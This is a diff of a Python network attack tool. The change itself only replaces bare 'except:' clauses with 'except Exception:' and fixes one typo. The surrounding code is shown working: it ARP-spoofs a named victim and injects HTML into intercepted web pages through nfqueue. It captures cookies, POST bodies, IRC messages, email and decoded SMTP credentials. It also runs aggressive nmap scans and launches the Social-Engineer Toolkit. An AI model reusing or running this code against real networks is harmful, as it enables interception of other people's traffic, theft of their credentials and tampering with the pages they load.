@@ -25,7 +25,7 @@ __version__ = 1.0
 
 try:
 	import nfqueue
-except:
+except Exception:
 	nfq = raw_input('[-] python-nfqueue not installed, would you like to install now? (apt-get install -y python-nfqueue will be run if yes) [y/n]: ')
 	if nfq == 'y':
 		os.system('apt-get install -y python-nfqueue')
@@ -137,12 +137,12 @@ class Parser():
 			if self.args.ipaddress:
 				try:
 					pkt = payload[IP]
-				except:
+				except Exception:
 					return
 		else:
 			try:
 				pkt = IP(payload.get_data())
-			except:
+			except Exception:
 				return
 
 		IP_layer = pkt[IP]
@@ -195,7 +195,7 @@ class Parser():
 
 		try:
 			headers, body = load.split("\r\n\r\n", 1)
-		except:
+		except Exception:
 			headers = load
 			body = ''
 		header_lines = headers.split("\r\n")
@@ -234,7 +234,7 @@ class Parser():
 			r = requests.get('http://'+self.html_url, headers=UA_header)
 			try:
 				body = r.text.encode('utf-8')
-			except:
+			except Exception:
 				payload.set_verdict(nfqueue.NF_ACCEPT)
 #			debugger = open('...', 'w')
 #			debugger.write(body)
@@ -246,11 +246,11 @@ class Parser():
 					try:
 						psplit = body.split('</head>', 1)
 						body = psplit[0]+bhtml+'</head>'+psplit[1]
-					except:
+					except Exception:
 						try:
 							psplit = body.split('<head>', 1)
 							body = psplit[0]+'<head>'+bhtml+psplit[1]
-						except:
+						except Exception:
 							if not self.args.code:
 								self.html_url = None
 								payload.set_verdict(nfqueue.NF_ACCEPT)
@@ -262,11 +262,11 @@ class Parser():
 					try:
 						psplit = body.split('<head>', 1)
 						body = psplit[0]+'<head>'+chtml+psplit[1]
-					except:
+					except Exception:
 						try:
 							psplit = body.split('</head>', 1)
 							body = psplit[0]+chtml+'</head>'+psplit[1]
-						except:
+						except Exception:
 							self.html_url = None
 							payload.set_verdict(nfqueue.NF_ACCEPT)
 							return
@@ -283,7 +283,7 @@ class Parser():
 						f.write(body)
 						f.close()
 						body = comp_body.getvalue()
-					except:
+					except Exception:
 						try:
 							pkt[Raw].load = headers+"\r\n\r\n"+body
 							pkt[IP].len = len(str(pkt))
@@ -294,7 +294,7 @@ class Parser():
 							print '[-] Could not recompress html, sent packet as is'
 							self.html_url = None
 							return
-						except:
+						except Exception:
 							self.html_url = None
 							payload.set_verdict(nfqueue.NF_ACCEPT)
 							return
@@ -311,7 +311,7 @@ class Parser():
 				self.block_acks.append(ack)
 				payload.set_verdict(nfqueue.NF_DROP)
 				self.html_url = None
-			except:
+			except Exception:
 				payload.set_verdict(nfqueue.NF_ACCEPT)
 				self.html_url = None
 				print '[-] Failed to inject packet'
@@ -326,10 +326,10 @@ class Parser():
 			if searchHost:
 				try:
 					return l.split('Host: ', 1)[1]
-				except:
+				except Exception:
 					try:
 						return l.split('host: ', 1)[1]
-					except:
+					except Exception:
 						return
 
 	def get_get(self, header_lines):
@@ -338,7 +338,7 @@ class Parser():
 			if searchGet:
 				try:
 					return l.split('GET ')[1].split(' ')[0]
-				except:
+				except Exception:
 					return
 
 	def get_post(self, header_lines):
@@ -347,7 +347,7 @@ class Parser():
 			if searchPost:
 				try:
 					return l.split(' ')[1].split(' ')[0]
-				except:
+				except Exception:
 					return
 
 	def get_url(self, host, get, post):
@@ -383,7 +383,7 @@ class Parser():
 			try:
 				urlsplit = url.split('/')
 				url = urlsplit[0]+'/'+urlsplit[1]
-			except:
+			except Exception:
 				pass
 			if self.HTTPfragged == 1:
 				print B+'[+] Fragmented POST: '+W+url+B+" HTTP POST's combined load: "+body+W
@@ -419,7 +419,7 @@ class Parser():
 				self.HTTPfragged = 0
 		try:
 			headers, body = load.split(r"\r\n\r\n", 1)
-		except:
+		except Exception:
 			headers = load
 			body = ''
 		header_lines = headers.split(r"\r\n")
@@ -512,7 +512,7 @@ class Parser():
 							ircmsg = load[1]
 							print C+'[+] IRC '+W+sender_nick+C+' to '+W+channel+C+': '+ircmsg[1:]+W
 							logger.write('[+] IRC '+sender_nick+' to '+channel+': '+ircmsg[1:]+'\n')
-						except:
+						except Exception:
 							return
 
 	def cookies(self, host, header_lines):
@@ -553,7 +553,7 @@ class Parser():
 
 		try:
 			headers, body = load.split(r"\r\n\r\n", 1)
-		except:
+		except Exception:
 			headers = load
 			body = ''
 		header_lines = headers.split(r"\r\n")
@@ -657,7 +657,7 @@ class Parser():
 					beginning = body.split(r"\r\n", 1)[0]
 					body1 = body.split(r"\r\n\r\n", 1)[1]
 					message = body1.split(beginning)[0][:-8] #get rid of last \r\n\r\n
-				except:
+				except Exception:
 					return
 			if message != '':
 				if self.mailfragged == 1:
@@ -684,13 +684,13 @@ class Parser():
 			try:
 				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
 				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-			except:
+			except Exception:
 				pass
 		else:
 			try:
 				b64str = load
 				decoded = repr(b64decode(b64str))[1:-1].replace(r'\x00', ' ')
-			except:
+			except Exception:
 				pass
 		# Test to see if decode worked
 		if '@' in decoded:
@@ -778,8 +778,8 @@ class active_users():
 			nmap = Popen(['/usr/bin/nmap', '-sn', '-n', IPprefix], stdout=PIPE, stderr=DN)
 			nmap = nmap.communicate()[0]
 			nmap = nmap.splitlines()[2:-1]
-		except:
-			print '[-] Nmap ARP ping failed, is it nmap installed?'
+		except Exception:
+			print '[-] Nmap ARP ping failed, is nmap installed?'
 		for x in nmap:
 			if 'Nmap' in x:
 				pieces = x.split()
@@ -811,14 +811,14 @@ class active_users():
 			nbt = nbt.communicate()[0]
 			nbt = nbt.splitlines()
 			nbt = nbt[4:]
-		except:
+		except Exception:
 			print '[-] nbtscan error, are you sure it is installed?'
 		for l in nbt:
 			try:
 				l = l.split()
 				nbtip = l[0]
 				nbtname = l[1]
-			except:
+			except Exception:
 				print '[-] Could not find any netbios names. Continuing without them'
 			if nbtip and nbtname:
 				for a in self.IPandMAC:
@@ -832,7 +832,7 @@ class active_users():
 			promisc = promiscSearch.communicate()[0]
 			monmodeSearch = re.search('monitor mode enabled on (.+)\)', promisc)
 			self.monmode = monmodeSearch.group(1)
-		except:
+		except Exception:
 			exit('[-] Enabling monitor mode failed, do you have aircrack-ng installed?')
 
 		sniff(iface=self.monmode, prn=self.pkt_cb, store=0)
@@ -885,7 +885,7 @@ def threads(args):
 				se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
 				se.daemon = True
 				se.start()
-			except:
+			except Exception:
 				print '[-] Could not open SEToolkit, is it installed? Continuing as normal without it.'
 
 	if args.nmapaggressive:
@@ -894,7 +894,7 @@ def threads(args):
 			n = Thread(target=os.system, args=('nmap -e '+interface+' -T4 -A -v -Pn -oN '+victimIP+'.nmap.txt '+victimIP+' >/dev/null 2>&1',))
 			n.daemon = True
 			n.start()
-		except:
+		except Exception:
 			print '[-] Aggressive Nmap scan failed, is nmap installed?'
 
 	if args.setoolkit:
@@ -903,7 +903,7 @@ def threads(args):
 			se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
 			se.daemon = True
 			se.start()
-		except:
+		except Exception:
 			print '[-] Could not open SEToolkit, continuing without it.'
 
 def pcap_handler(args):
@@ -1009,7 +1009,7 @@ def main(args):
 			routerMAC = Spoof().originalMAC(routerIP)
 			print "[*] Router MAC: " + routerMAC
 			logger.write("[*] Router MAC: "+routerMAC+'\n')
-		except:
+		except Exception:
 			try:
 				print "[-] Router did not respond to ARP request for MAC, attempting to pull the MAC from the ARP cache"
 				arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
@@ -1018,7 +1018,7 @@ def main(args):
 				routerMAC = arpoutput[2]
 				print "[*] Router MAC: " + routerMAC
 				logger.write("[*] Router MAC: "+routerMAC+'\n')
-			except:
+			except Exception:
 				sys.exit("[-] [arp -n] failed to give accurate router MAC address")
 
 	if args.victimmac:
@@ -1030,13 +1030,13 @@ def main(args):
 			victimMAC = Spoof().originalMAC(victimIP)
 			print "[*] Victim MAC: " + victimMAC
 			logger.write("[*] Victim MAC: "+victimMAC+'\n')
-		except:
+		except Exception:
 			exit("[-] Could not get victim MAC address; try the -vmac [xx:xx:xx:xx:xx:xx] option if you know the victim's MAC address")
 	if dnsIP != routerIP:
 		try:
 			dnsMAC = Spoof().originalMAC(dnsIP)
 			print "[*] DNS server MAC: " + dnsMAC
-		except:
+		except Exception:
 			print "[-] Could not get DNS server MAC address; continuing"
 	if dnsIP == routerIP:
 		dnsMAC = routerMAC
@@ -1055,7 +1055,7 @@ def main(args):
 				if x != '':
 					print '[+]',x
 					logger.write('[+] '+x+'\n')
-		except:
+		except Exception:
 			print '[-] Nmap port and OS scan failed, is it installed?'
 
 	print ''
